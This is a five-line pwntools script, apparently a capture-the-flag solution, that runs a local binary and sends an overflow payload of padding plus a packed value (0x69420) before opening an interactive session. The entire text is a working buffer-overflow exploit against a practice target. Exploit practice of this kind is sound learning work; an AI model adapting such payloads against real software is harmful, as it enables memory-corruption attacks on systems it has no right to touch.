from pwn import *
p=process("./a.out")
payload = b"A"*(0x110 - 0x4) + p64(0x69420)
p.sendline(payload)
p.interactive()
